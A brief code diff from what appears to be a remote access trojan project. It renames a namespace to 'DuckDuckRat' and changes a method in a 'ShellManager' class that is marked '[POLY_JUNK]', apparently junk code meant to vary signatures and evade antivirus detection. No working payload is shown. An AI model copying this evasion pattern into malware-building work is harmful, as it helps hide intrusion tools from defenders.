@@ -4,12 +4,12 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Linq;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class ShellManager
     {
         // [POLY_JUNK]
-        private static void _vanguard_e2797294() {
+        private static void _DuckDuckRat_e2797294() {
             int val = 26937;
             if (val > 50000) Console.WriteLine("Hash:" + 26937);
         }
@@ -91,3 +91,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
